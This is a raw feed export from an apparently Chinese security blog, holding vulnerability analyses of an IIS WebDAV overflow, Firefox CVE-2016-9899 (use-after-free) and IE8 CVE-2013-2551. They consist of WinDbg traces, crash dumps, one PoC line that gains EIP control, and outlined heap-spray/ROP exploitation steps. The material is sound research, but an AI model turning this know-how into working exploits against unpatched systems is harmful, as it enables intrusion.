class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">673f575c 85c0            <span class="hljs-built_in">test</span>    eax,eax</span><br><span class="line">673f575e 0f84ee000000    je      httpext!CParseLockTokenHeader::HrGetLockIdForPath+0x22b (673f5852)</span><br><span class="line">673f5764 8b0b            mov     ecx,dword ptr [ebx]  ds:0023:012cfbe8=01e4ed58</span><br><span class="line">673f5766 8d85d4fdffff    lea     eax,[ebp-22Ch]</span><br><span class="line">673f576c 50              push    eax</span><br><span class="line">673f576d ff75ec          push    dword ptr [ebp-14h]</span><br><span class="line">673f5770 ffb5e0feffff    push    dword ptr [ebp-120h]</span><br><span class="line">673f5776 e8d63cffff      call    httpext!CMethUtil::ScStoragePathFromUrl (673e9451)</span><br><span class="line">673f577b 8985c8fdffff    mov     dword ptr [ebp-238h],eax</span><br></pre></td></tr></tbody></table></figure><br>&#x865A;&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF1A;ecx = [012cfbe8] = 01e4ed58<br>&#x590D;&#x5236;&#x7684;&#x9996;&#x5730;&#x5740;&#xFF1A;012cfab4<br>&#x56E0;&#x6B64;&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#x7684;&#x65F6;&#x5019;&#x6EA2;&#x51FA;&#x5FC5;&#x5B9A;&#x4F1A;&#x6539;&#x53D8;012cfbe8&#x7684;&#x503C;&#xFF0C;&#x56E0;&#x6B64;&#x5C06;&#x4F1A;&#x5BFC;&#x81F4;&#x4E0B;&#x6B21;&#x6267;&#x884C;&#x65F6;&#x865A;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5BFC;&#x81F4;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;<br>&#x7EE7;&#x7EED;&#xFF1A;httpext!CParseLockTokenHeader::HrGetLockIdForPath&#x8C03;&#x7528;&#x4E4B;&#x524D;&#x4F1A;&#x9996;&#x5148;&#x8BBF;&#x95EE;&#x7684;httpext!CMethUtil::ScStoragePathFromUrl&#xFF0C;&#x7136;&#x540E;&#x7ECF;&#x8FC7;&#x5B83;&#x8FDB;&#x884C;&#x8C03;&#x7528;&#x3002;<p></p><p>&#x6B64;&#x65F6;&#x865A;&#x51FD;&#x6570;&#x7684;&#x9996;&#x5730;&#x5740;&#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;&#xFF0C;01e4d968</p><p>&#x590D;&#x5236;&#x7684;&#x521D;&#x59CB;&#x5730;&#x5740;&#x4E3A; [012cf95c]=012cfab4<br>&#x865A;&#x8868;&#x90E8;&#x5206;&#x5730;&#x5740;&#x4E3A; [012cfab0+0x10] = 01e4d968<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">httpext!CMethUtil::ScStoragePathFromUrl:</span><br><span class="line">673e9451 8bff            mov     edi,edi</span><br><span class="line">673e9453 55              push    ebp</span><br><span class="line">673e9454 8bec            mov     ebp,esp</span><br><span class="line">673e9456 8b4910          mov     ecx,dword ptr [ecx+10h]</span><br><span class="line">673e9459 8b5508          mov     edx,dword ptr [ebp+8]</span><br><span class="line">673e945c 6a00            push    0</span><br><span class="line">673e945e ff7510          push    dword ptr [ebp+10h]</span><br><span class="line">673e9461 ff750c          push    dword ptr [ebp+0Ch]  ss:0023:012cf95c=012cfab4</span><br><span class="line">673e9464 e812d80000      call    httpext!ScStoragePathFromUrl (673f6c7b)</span><br><span class="line">673e9469 5d              pop     ebp</span><br><span class="line">673e946a c20c00          ret     0Ch</span><br></pre></td></tr></tbody></table></figure><br>&#x56E0;&#x6B64;&#x5728;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF1A;&#x6210;&#x529F;&#x8986;&#x76D6;&#x5230;&#x7B2C;&#x4E09;&#x6B21;&#x62F7;&#x8D1D;&#x7684;&#x5730;&#x5740;<br>&#x5373;&#x8FD9;&#x91CC;&#x7684;ecx<br>mov     ecx,dword ptr [ebx]  ds:0023:012cfbe8=680313c0<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">673f5708 e8a70d0000      call    httpext!ScCanonicalizePrefixedURL (673f64b4)</span><br><span class="line">673f570d 8bd8            mov     ebx,eax</span><br><span class="line">673f570f 85db            <span class="hljs-built_in">test</span>    ebx,ebx</span><br><span class="line">673f5711 0f8519010000    jne     httpext!CParseLockTokenHeader::HrGetLockIdForPath+0x209 (673f5830)</span><br><span class="line">673f5717 8b45e8          mov     eax,dword ptr [ebp-18h]</span><br><span class="line">673f571a 8b9dc4fdffff    mov     ebx,dword ptr [ebp-23Ch]</span><br><span class="line">673f5720 8b0b            mov     ecx,dword ptr [ebx]  ds:0023:012cfbe8=680313c0</span><br><span class="line">673f5722 c1e803          shr     eax,3</span><br><span class="line">673f5725 8985d4fdffff    mov     dword ptr [ebp-22Ch],eax</span><br><span class="line">673f572b 8d85d4fdffff    lea     eax,[ebp-22Ch]</span><br><span class="line">673f5731 50              push    eax</span><br><span class="line">673f5732 ff75ec          push    dword ptr [ebp-14h]</span><br><span class="line">673f5735 ffb5e0feffff    push    dword ptr [ebp-120h]</span><br><span class="line">673f573b e8113dffff      call    httpext!CMethUtil::ScStoragePathFromUrl (673e9451)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h2><p>&#x5C5E;&#x4E8E;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x5728;&#x7B2C;&#x4E8C;&#x6B21;&#x8FDB;&#x5165;&#x5173;&#x952E;&#x51FD;&#x6570;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x5E94;&#x8BE5;&#x5B58;&#x5728;&#x6EA2;&#x51FA;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;Fuzz&#x5E94;&#x8BE5;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x4E2A;URL&#x5305;&#x5373;&#x53EF;&#xFF0C;&#x52A0;&#x4E24;&#x4E2A;&#x5E94;&#x8BE5;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x540E;&#x9762;&#x7684;&#x5229;&#x7528;&#x3002;<br>&#x731C;&#x6D4B;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF08;&#x6B21;&#x6570;&#x4EE3;&#x8868;&#x51FB;&#x4E2D;&#x5173;&#x952E;&#x51FD;&#x6570;ScStoragePathFromUrl&#xFF09;&#xFF1A;<br>&#x7B2C;&#x4E00;&#x6B21;&#x6CA1;&#x592A;&#x5927;&#x7528;&#x5904;&#xFF0C;&#x7B2C;&#x4E8C;&#x6B21; &#x901A;&#x8FC7;memcpy&#x62F7;&#x8D1D; aaa&#x90A3;&#x91CC;&#x7684;&#x6570;&#x636E; &#x6EA2;&#x51FA;&#x8986;&#x76D6;&#x7B2C;&#x4E09;&#x6B21;&#x7684;&#x5806;&#x5730;&#x5740;&#x9996;&#x5730;&#x5740;&#xFF08;&#x7531;&#x6808;&#x533A;&#x7684;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x51B3;&#x5B9A;&#xFF09;&#xFF1B;&#x56E0;&#x6B64;&#x7B2C;&#x4E09;&#x6B21;&#x62F7;&#x8D1D;&#x5C5E;&#x4E8E; &#x6307;&#x5B9A;&#x5730;&#x5740;&#x62F7;&#x8D1D;&#xFF1B;&#x7B2C;&#x56DB;&#x6B21;&#x4E5F;&#x662F;&#x68C0;&#x67E5;&#xFF1B;&#x7B2C;&#x4E94;&#x6B21;&#x6EA2;&#x51FA;&#x8986;&#x76D6;&#x51FD;&#x6570;&#x6307;&#x9488;&#x6307;&#x5411;&#x7B2C;&#x4E09;&#x6B21;&#x8BBE;&#x8BA1;&#x597D;&#x7684;&#x5730;&#x5740;&#xFF08;&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x7591;&#x60D1;&#x5C31;&#x662F;&#x51FD;&#x6570;&#x6307;&#x9488;&#x7684;&#x5730;&#x5740;&#x4F1A;&#x5728;&#x6B63;&#x5E38;&#x5806;&#x5206;&#x914D;&#x5730;&#x5740;&#x4E4B;&#x540E;&#xFF0C;&#x6240;&#x4EE5;&#x5BFC;&#x81F4;&#x8986;&#x76D6;&#x7684;&#x51FA;&#x73B0;&#xFF09;&#xFF0C;&#x7B2C;&#x516D;&#x6B21;&#x8C03;&#x7528;&#x89E6;&#x53D1;&#x6267;&#x884C;</p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-9899 分析与利用</title>
      <link href="/2017/03/27/CVE-2016-9899/"/>
      <url>/2017/03/27/CVE-2016-9899/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><h2 id><a href="#" class="headerlink" title></a></h2><p>&#x5143;&#x7D20;&#x521B;&#x5EFA; &#x5206;&#x914D;&#x4E86;&#x591A;&#x5927;&#x5185;&#x5B58;, &#x4E00;&#x822C;&#x9759;&#x6001;&#x5206;&#x6790;&#xFF08;&#x7528;&#x4E8E;&#x540E;&#x9762;&#x7684;&#x5360;&#x4F4D;&#xFF09;<br>&#x5143;&#x7D20;&#x91CA;&#x653E;<br>&#x91CD;&#x7528;</p><ol><li>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x3000;&#x5F00;&#x542F;hpa ust&#x80FD;&#x591F;&#x8FFD;&#x8E2A;&#x5230;&#x5F02;&#x5E38; &#x5185;&#x5B58;&#x7684;&#x521B;&#x5EFA;&#xFF0C;&#x91CA;&#x653E; &#x91CD;&#x7528; &#x8FC7;&#x7A0B; </li><li>&#x76F4;&#x63A5;&#x65AD;&#x70B9; &#x6240;&#x6709;&#x521B;&#x5EFA; &#x7684;&#x5143;&#x7D20; &#x4E0E; &#x540E;&#x9762;&#x91CD;&#x7528;&#x7684;&#x5143;&#x7D20;&#x5BF9;&#x8C61;&#x7684;&#x5730;&#x5740; &#x6765;&#x5224;&#x65AD; &#x662F;&#x90A3;&#x4E2A;&#x5BF9;&#x8C61; &#x7684;UAF</li></ol><h3 id="crash-info"><a href="#crash-info" class="headerlink" title="crash info"></a>crash info</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:000:x86&gt; r</span><br><span class="line">eax=13768c00 ebx=00000000 ecx=0018de68 edx=4543484f esi=0018de84 edi=110d2e80</span><br><span class="line">eip=02bfc44c esp=0018de58 ebp=0018de6c iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206</span><br><span class="line">xul!nsCOMPtr&lt;nsIContent&gt;::nsCOMPtr&lt;nsIContent&gt;+0x1d:</span><br><span class="line">02bfc44c ff12            call    dword ptr [edx]      ds:002b:4543484f=????????</span><br><span class="line">0:000:x86&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0018de6c 0318df89 13768c00 00000003 0018dea8 xul!nsCOMPtr&lt;nsIContent&gt;::nsCOMPtr&lt;nsIContent&gt;+0x1d [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\obj-firefox\dist\include\nscomptr.h @ 504]</span><br><span class="line">0018de7c 02d2fa21 00000000 00000000 0ed14400 xul!nsPluginFrame::BeginSwapDocShells+0xf [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\layout\generic\nspluginframe.cpp @ 1796]</span><br><span class="line">0018dea8 02dcf404 0318df7a 00000000 110d2760 xul!nsIDocument::EnumerateActivityObservers+0x33 [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\dom\base\nsdocument.cpp @ 10246]</span><br><span class="line">0018dec4 02dcf3a6 11402800 00000000 110e0058 xul!BeginSwapDocShellsForDocument+0x42 [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\layout\generic\nssubdocumentframe.cpp @ 1100]</span><br><span class="line">0018dedc 02dcf2ab 110dfd90 110e01a8 110e0058 xul!BeginSwapDocShellsForViews+0x1e [c:\builds\moz2_slave\m-rel-w32-00000000000000000000\build\src\layout\generic\nssubdocumentframe.cpp @ 1112]</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*static*/</span> <span class="hljs-keyword">void</span></span><br><span class="line">nsPluginFrame::BeginSwapDocShells(nsISupports* aSupports, <span class="hljs-keyword">void</span>*)</span><br><span class="line">{</span><br><span class="line">  NS_PRECONDITION(aSupports, <span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-function">nsCOMPtr&lt;nsIContent&gt; <span class="hljs-title">content</span><span class="hljs-params">(do_QueryInterface(aSupports))</span></span>;  <span class="hljs-comment">//&#x5728;&#x8FD9;&#x91CC;&#x8C03;&#x7528; &#x6784;&#x9020;&#x51FD;&#x6570; </span></span><br><span class="line">  <span class="hljs-keyword">if</span> (!content) {</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="create"><a href="#create" class="headerlink" title="create"></a>create</h2><p><a href="https://github.com/jostw/gecko" target="_blank" rel="noopener">https://github.com/jostw/gecko</a></p><h3 id="&#x786E;&#x5B9A;&#x5143;&#x7D20;&#x521B;&#x5EFA;&#x7684;&#x51FD;&#x6570;"><a href="#&#x786E;&#x5B9A;&#x5143;&#x7D20;&#x521B;&#x5EFA;&#x7684;&#x51FD;&#x6570;" class="headerlink" title="&#x786E;&#x5B9A;&#x5143;&#x7D20;&#x521B;&#x5EFA;&#x7684;&#x51FD;&#x6570;"></a>&#x786E;&#x5B9A;&#x5143;&#x7D20;&#x521B;&#x5EFA;&#x7684;&#x51FD;&#x6570;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:000:x86&gt; x xul!*document*createElement*</span><br><span class="line">04d17284 xul!mozilla::dom::DocumentBinding::createElementNS_methodinfo = struct JSJitInfo</span><br><span class="line">04d16cd8 xul!mozilla::dom::DocumentBinding::createElement_methodinfo = struct JSJitInfo</span><br><span class="line">02cf93f8 xul!mozilla::dom::XULDocument::CreateElementFromPrototype (void)</span><br><span class="line">0409cc55 xul!mozilla::dom::XULDocument::CreateElement (void)</span><br><span class="line">0409cc55 xul!nsHTMLDocument::CreateElement (void)</span><br><span class="line">02e3891e xul!mozilla::dom::DocumentBinding::createElementNS (void)</span><br><span class="line">039aebb5 xul!nsDocument::CreateElement (void)</span><br><span class="line">030ac339 xul!nsDocument::CreateElement (void)</span><br><span class="line">030ac1ff xul!mozilla::dom::DocumentBinding::createElement (void)</span><br><span class="line">03e25609 xul!mozilla::dom::XULDocument::CreateElementNS (void)</span><br><span class="line">03e25609 xul!nsHTMLDocument::CreateElementNS (void)</span><br><span class="line">039aec70 xul!nsDocument::CreateElementNS (void)</span><br><span class="line">02e38bf5 xul!nsDocument::CreateElementNS (void)</span><br><span class="line">03265ce4 xul!mozilla::dom::XULDocument::CreateElement = &lt;no <span class="hljs-built_in">type</span> information&gt;</span><br><span class="line">03260950 xul!nsHTMLDocument::CreateElement = &lt;no <span class="hljs-built_in">type</span> information&gt;</span><br><span class="line">0326095d xul!nsHTMLDocument::CreateElementNS = &lt;no <span class="hljs-built_in">type</span> information&gt;</span><br><span class="line">03265cf1 xul!mozilla::dom::XULDocument::CreateElementNS = &lt;no <span class="hljs-built_in">type</span> information&gt;</span><br></pre></td></tr></tbody></table></figure><br>&#x6838;&#x5FC3;&#x51FD;&#x6570;<br>ur&#x7EE7;&#x7EED;&#x67E5;&#x770B;&#x53CD;&#x6C47;&#x7F16;&#x4EE3;&#x7801;<br>uf&#x67E5;&#x770B;&#x6574;&#x4E2A;&#x51FD;&#x6570;&#x53CD;&#x6C47;&#x7F16;&#x4EE3;&#x7801;<br>ub&#x4EE5;&#x8BE5;&#x5730;&#x5740;&#x4E3A;&#x7ED3;&#x675F;&#x5730;&#x5740;<br>&#x7B2C;&#x4E00;&#x4E2A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nsCOMPtr&lt;Element&gt; element = CreateElement(aTagName, options, rv);</span><br></pre></td></tr></tbody></table></figure><br>&#x7B2C;&#x4E8C;&#x4E2A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RefPtr&lt;Element&gt; elem = CreateElem(</span><br><span class="line">    needsLowercase ? lcTagName : aTagName, nullptr, mDefaultElementType, is);</span><br></pre></td></tr></tbody></table></figure><br>&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x6C47;&#x7F16;&#x51FD;&#x6570;&#x504F;&#x79FB; &#x8BBE;&#x7F6E;&#x65AD;&#x70B9;<br>&#x786E;&#x5B9A;&#x4E3A; &#x7B2C;&#x4E8C;&#x4E2A;  &#x5730;&#x5740;&#x504F;&#x5C0F;&#x7684;&#x4E00;&#x4E2A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000:x86&gt; bl</span><br><span class="line"> 0 e x86 039aec0e     0001 (0001)  0:**** xul!nsDocument::CreateElement+0x59 <span class="hljs-string">&quot;dps poi(eax); .echo &apos;----------&apos;; gc&quot;</span></span><br><span class="line"> 1 e x86 030ac415     0001 (0001)  0:**** xul!nsDocument::CreateElement+0xdc <span class="hljs-string">&quot;dps poi(eax); .echo &apos;----------&apos;; gc&quot;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x8FD0;&#x884C;&#x540E;&#x62FF;&#x5230;&#x4FE1;&#x606F;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">&apos;----------&apos;</span></span><br><span class="line">13768c00  0506b070 xul!mozilla::dom::HTMLAudioElement::`vftable<span class="hljs-string">&apos;</span></span><br><span class="line"><span class="hljs-string">13768c04  050975d8 xul!mozilla::dom::HTMLAudioElement::`vftable&apos;</span></span><br><span class="line">13768c08  00000000</span><br><span class="line">13768c0c  00100000</span><br><span class="line">13768c10  1010ea10</span><br><span class="line">13768c14  00000000</span><br><span class="line">13768c18  00020008 VCRUNTIME140!__ImageBase+0x8</span><br><span class="line">13768c1c  00000000</span><br><span class="line">13768c20  00000000</span><br><span class="line">13768c24  00000000</span><br><span class="line">13768c28  13768c00</span><br><span class="line">13768c2c  00000000</span><br><span class="line">13768c30  00000005</span><br><span class="line">13768c34  00000000</span><br><span class="line">13768c38  00020000 VCRUNTIME140!__ImageBase</span><br><span class="line">13768c3c  00000400</span><br><span class="line">13768c40  0506c05c xul!mozilla::dom::HTMLAudioElement::`vftable<span class="hljs-string">&apos;</span></span><br></pre></td></tr></tbody></table></figure><br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000:x86&gt; r</span><br><span class="line">eax=13768c00 ebx=00000000 ecx=0018de68 edx=4543484f esi=0018de84 edi=110d2e80</span><br><span class="line">eip=02bfc44c esp=0018de58 ebp=0018de6c iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206</span><br><span class="line">xul!nsCOMPtr&lt;nsIContent&gt;::nsCOMPtr&lt;nsIContent&gt;+0x1d:</span><br><span class="line">02bfc44c ff12            call    dword ptr [edx]      ds:002b:4543484f=????????</span><br></pre></td></tr></tbody></table></figure><br>&#x5BF9;&#x6BD4;&#x4E00;&#x4E0B;&#x53EF;&#x77E5; &#x524D;&#x9762;&#x7533;&#x8BF7;&#x7684;&#x5730;&#x5740;&#x662F; 13768c00&#xFF0C;&#x540E;&#x9762;&#x91CD;&#x4F7F;&#x7528;&#x7684;&#x662F;eax=13768c00&#xFF0C;&#x56E0;&#x6B64;&#x5E94;&#x8BE5;&#x662F;HTMLAudioElement&#x5BF9;&#x8C61;&#x91CA;&#x653E;&#x540E;&#x91CD;&#x7528;<p></p><p>&#x7EE7;&#x7EED;&#x8DDF;&#x5230;blbl</p><h2 id="&#x5229;&#x7528;"><a href="#&#x5229;&#x7528;" class="headerlink" title="&#x5229;&#x7528;"></a>&#x5229;&#x7528;</h2><p>&#x6D4F;&#x89C8;&#x5668;UAF&#x57FA;&#x672C;&#x5229;&#x7528;&#x65B9;&#x6CD5;&#x662F;&#xFF0C;&#x5728;&#x91CA;&#x653E;&#x4E4B;&#x540E;&#x7533;&#x8BF7;&#x4E00;&#x5757;&#x76F8;&#x540C;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#x5360;&#x4F4D;&#xFF0C;&#x4ECE;&#x800C;&#x5728;&#x91CD;&#x7528;&#x65F6;&#x63A7;&#x5236;EIP&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5806;&#x55B7;&#x5C04;&#x7ED5;&#x8FC7;ASLR&#xFF0C;&#x4F7F;&#x7528;ROP&#x7ED5;&#x8FC7;DEP&#x3002;</p><h3 id="&#x5360;&#x4F4D;"><a href="#&#x5360;&#x4F4D;" class="headerlink" title="&#x5360;&#x4F4D;"></a>&#x5360;&#x4F4D;</h3><h3 id="&#x5806;&#x55B7;&#x5C04;"><a href="#&#x5806;&#x55B7;&#x5C04;" class="headerlink" title="&#x5806;&#x55B7;&#x5C04;"></a>&#x5806;&#x55B7;&#x5C04;</h3><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VUzzer</title>
      <link href="/2017/03/17/VUzzer/"/>
      <url>/2017/03/17/VUzzer/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2013-2551分析</title>
      <link href="/2017/03/10/CVE-2013-2551/"/>
      <url>/2017/03/10/CVE-2013-2551/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="&#x8C03;&#x8BD5;&#x524D;"><a href="#&#x8C03;&#x8BD5;&#x524D;" class="headerlink" title="&#x8C03;&#x8BD5;&#x524D;"></a>&#x8C03;&#x8BD5;&#x524D;</h2><p>&#x5206;&#x6790;&#x7528;&#x7684;PoC&#x6765;&#x81EA;&#x4E8E;&#x6CC9;&#x54E5;&#x7684;&#x6F0F;&#x6D1E;&#x6218;&#x4E89;&#x4E00;&#x4E66;&#x3002;PoC&#x89C1;&#x6587;&#x7AE0;&#x6700;&#x540E;&#x3002;<br>&#x8DDF;&#x7740;PoC&#x8D70;&#x4E00;&#x904D;&#xFF0C;crashme&#x51FD;&#x6570;&#x4E2D;&#x57FA;&#x672C;&#x90FD;&#x662F;&#x5728;&#x5BF9;v:stroke&#x5728;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x5305;&#x62EC;&#x5BF9;&#x5176;dashstyle&#x5C5E;&#x6027;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;Google&#x4E00;&#x4E0B;v:stroke msdn&#xFF0C;&#x8BE5;&#x90E8;&#x5206;&#x5C5E;&#x4E8E;VML&#xFF08;&#x77E2;&#x91CF;&#x6807;&#x8BB0;&#x8BED;&#x8A00;&#xFF09;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;IE&#x4E2D;&#x7684;&#x753B;&#x7B14;&#xFF0C;&#x7ED8;&#x5236;&#x56FE;&#x5F62;&#x4E4B;&#x7C7B;&#x7684;&#x3002;</p><h2 id="&#x73AF;&#x5883;"><a href="#&#x73AF;&#x5883;" class="headerlink" title="&#x73AF;&#x5883;"></a>&#x73AF;&#x5883;</h2><p>win7 sp1 32<br>IE8 8.0.7601.17514IS<br>&#x5728;&#x5DF2;&#x7ECF;&#x88C5;&#x4E86;IE11&#x7684;&#x673A;&#x5668;&#x4E0A;&#x5378;&#x8F7D;&#x66F4;&#x65B0;&#x8FBE;&#x5230;IE8&#x540E;&#xFF0C;&#x8868;&#x793A;&#x65E0;&#x6CD5;&#x89E6;&#x53D1;Crash&#xFF08;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x7EAF;IE&#x6D4B;&#x8BD5;&#xFF09;</p><h2 id="&#x5206;&#x6790;"><a href="#&#x5206;&#x6790;" class="headerlink" title="&#x5206;&#x6790;"></a>&#x5206;&#x6790;</h2><p>&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;PoC&#x5DF2;&#x7ECF;&#x80FD;&#x591F;&#x5F88;&#x660E;&#x663E;&#x63A7;&#x5236;&#x5230;EIP&#x4E86;&#xFF0C;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:022&gt; g</span><br><span class="line">(b14.d40): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=0185cda8 ebx=04e4a654 ecx=01852988 edx=4b5f5f4b esi=0185ce28 edi=04e4a6dc</span><br><span class="line">eip=69104ea7 esp=04e4a52c ebp=04e4a53c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">jscript!CScriptRuntime::GetVarVal+0x6c:</span><br><span class="line">69104ea7 8b5270          mov     edx,dword ptr [edx+70h] ds:0023:4b5f5fbb=????????</span><br></pre></td></tr></tbody></table></figure><br>&#x53D1;&#x73B0;&#x662F;&#x5728;&#x8BBF;&#x95EE;edx+70h&#x65F6;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#xFF0C;&#x800C;edx+70h = 4b5f5fbb, edx&#x4E3A;4b5f5f4b&#xFF0C;&#x8DDF;&#x5230;PoC&#x53D1;&#x73B0;&#x8FD9;&#x6B63;&#x662F;PoC&#x4E2D;&#x6240;&#x8D4B;&#x503C;&#x7684;&#x5185;&#x5BB9;&#xFF1A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shape.dashstyle.array.item(0x2E+0x16+i) = 0x4b5f5f4b;</span><br></pre></td></tr></tbody></table></figure><br>&#x8BF4;&#x660E;&#x6B64;&#x65F6;&#x7684;edx&#x53EF;&#x63A7;&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x540E;&#x9762;&#x5C06;&#x4F1A;call edx<br><figure class="highlight bash hljs"><table><tbody><tr><td 